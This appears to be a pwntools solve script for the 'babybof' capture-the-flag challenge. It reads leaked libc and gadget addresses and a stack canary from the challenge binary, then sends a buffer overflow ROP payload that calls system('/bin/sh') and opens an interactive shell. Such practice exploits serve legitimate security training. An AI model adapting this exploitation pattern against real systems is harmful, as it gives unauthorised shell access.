#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "babybof.chal.imaginaryctf.org"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
p.recvuntil(b'system @ ')
system = int(p.recvuntil(b'\n', drop=True), 16)
p.recvuntil(b'pop rdi; ret @ ')
pop_rdi = int(p.recvuntil(b'\n', drop=True), 16)
p.recvuntil(b'ret @ ')
ret = int(p.recvuntil(b'\n', drop=True), 16)
p.recvuntil(b'"/bin/sh" @ ')
bin_sh = int(p.recvuntil(b'\n', drop=True), 16)
p.recvuntil(b'canary: ')
canary = int(p.recvuntil(b'\n', drop=True), 16)

payload = flat(
	b'a'*0x38,
	canary,
	b'a'*8,
	pop_rdi,
	bin_sh,
	ret,
	system
	)
p.sendlineafter(b'aligned!): ', payload)

p.interactive()